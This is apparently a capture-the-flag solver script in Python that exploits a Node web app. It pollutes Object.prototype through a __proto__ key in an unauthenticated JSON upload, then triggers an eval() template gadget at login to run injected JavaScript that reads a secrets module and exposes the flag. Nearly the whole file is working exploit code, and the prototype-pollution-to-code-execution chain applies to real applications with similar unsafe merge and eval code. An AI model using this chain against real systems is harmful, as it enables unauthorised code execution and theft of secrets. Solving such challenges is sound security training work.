#!/usr/bin/env python3
"""
Pollution solver.

Chain:
1. POST /upload/users (no auth) with a users array. For an item whose
   lcUsername matches an existing user (alice), the route runs the unguarded
   recursive merge(): merge(Object.assign({}, user), item). A JSON __proto__
   key pollutes Object.prototype.userAutoCreateTemplate.
2. options.userAutoCreateTemplate (a module Object) now resolves via the
   polluted prototype -> truthy -> passport.authenticate() builds a template
   literal and eval()s it. ${...} runs arbitrary JS in module scope.
3. Log in as a NON-existent user -> gadget fires -> creates a user whose bio
   is secrets.flag -> session established.
4. Read /profile -> flag.

Usage: solve.py [BASE_URL]   (default http://127.0.0.1:13000)
"""
import json
import re
import sys

import requests

BASE = sys.argv[1] if len(sys.argv) > 1 else "http://127.0.0.1:13000"
PWUSER = "pwned_solver"
PWPASS = "pwpass1"

# Template stored into Object.prototype.userAutoCreateTemplate. It is later
# placed inside backticks by passport.js, so ${...} is evaluated as JS in the
# module scope where require() is available. Result must be JSON.
TEMPLATE = (
    '{"username":"' + PWUSER + '","bio":"${require(\'./secrets\').flag}"}'
)

payload = [
    {
        "lcUsername": "alice",          # must match an existing user
        "__proto__": {"userAutoCreateTemplate": TEMPLATE},
    }
]

s = requests.Session()

print("[*] Polluting Object.prototype.userAutoCreateTemplate ...")
files = {"upload-users": ("users.json", json.dumps(payload), "application/json")}
r = s.post(f"{BASE}/upload/users", files=files, allow_redirects=False)
print(f"    upload status: {r.status_code}")

print(f"[*] Triggering eval() gadget via login of non-existent user '{PWUSER}' ...")
r = s.post(
    f"{BASE}/login",
    data={"username": PWUSER, "password": PWPASS},
    headers={"Referer": f"{BASE}/login"},
    allow_redirects=False,
)
print(f"    login status: {r.status_code} -> {r.headers.get('location')}")

print("[*] Reading /profile ...")
r = s.get(f"{BASE}/profile")
m = re.search(r"grey\{[^}]*\}", r.text)
if m:
    flag = m.group(0)
    print(f"[+] FLAG: {flag}")
    import os
    with open(os.path.join(os.path.dirname(os.path.abspath(__file__)), "flag.txt"), "w") as f:
        f.write(flag + "\n")
    sys.exit(0)
else:
    print("[-] No flag in /profile. Status:", r.status_code)
    snippet = r.text[:800]
    print(snippet)
    sys.exit(1)
